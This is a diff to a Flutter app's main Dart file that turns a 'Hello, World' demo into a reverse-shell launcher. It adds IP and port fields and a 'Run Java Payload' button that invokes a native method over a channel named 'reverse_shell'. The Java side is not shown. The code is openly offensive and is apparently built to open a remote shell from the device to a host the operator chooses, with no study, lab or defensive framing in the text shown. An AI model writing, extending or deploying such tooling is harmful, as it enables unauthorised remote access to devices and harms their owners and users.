@@ -1,41 +1,80 @@
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 
-void main() => runApp(MyApp());
+void main() {
+  runApp(MyApp());
+}
 
 class MyApp extends StatelessWidget {
-  const MyApp({super.key});
-  // This widget is the root of your application.
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      // Application name
-      title: 'Flutter Hello World',
-      // Application theme data, you can set the colors for the application as
-      // you want
+      title: 'Run Java Code',
       theme: ThemeData(
-        // useMaterial3: false,
         primarySwatch: Colors.blue,
       ),
-      // A widget which will be started on application startup
-      home: MyHomePage(title: 'Flutter Demo Home Page'),
+      home: MyHomePage(),
     );
   }
 }
 
-class MyHomePage extends StatelessWidget {
-  final String title;
-  const MyHomePage({super.key, required this.title});  
+class MyHomePage extends StatefulWidget {
+  @override
+  _MyHomePageState createState() => _MyHomePageState();
+}
+
+class _MyHomePageState extends State<MyHomePage> {
+  static const platform = MethodChannel('com.example.java_in_flutter/reverse_shell');
+
+  TextEditingController ipController = TextEditingController();
+  TextEditingController portController = TextEditingController();
+  String result = '';
+
+  Future<void> runJavaPayload(String ip, int port) async {
+    try {
+      final String res = await platform.invokeMethod('runJavaPayload', {'ip': ip, 'port': port});
+      setState(() {
+        result = res;
+      });
+    } on PlatformException catch (e) {
+      setState(() {
+        result = "Failed to run Java Payload: '${e.message}'.";
+      });
+    }
+  }
 
   @override
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        // The title text which will be shown on the action bar
-        title: Text(title),
+        title: Text("Run Java Code in Flutter"),
       ),
-      body: Center(
-        child: Text(
-          'Hello, World!',
+      body: Padding(
+        padding: const EdgeInsets.all(16.0),
+        child: Column(
+          mainAxisAlignment: MainAxisAlignment.center,
+          children: <Widget>[
+            TextField(
+              controller: ipController,
+              decoration: InputDecoration(hintText: 'Enter IP Address'),
+            ),
+            TextField(
+              controller: portController,
+              decoration: InputDecoration(hintText: 'Enter Port'),
+              keyboardType: TextInputType.number,
+            ),
+            SizedBox(height: 20),
+            ElevatedButton(
+              onPressed: () {
+                String ip = ipController.text;
+                int port = int.parse(portController.text);
+                runJavaPayload(ip, port);
+              },
+              child: Text('Run Java Payload'),
+            ),
+            SizedBox(height: 20),
+            Text(result),
+          ],
         ),
       ),
     );
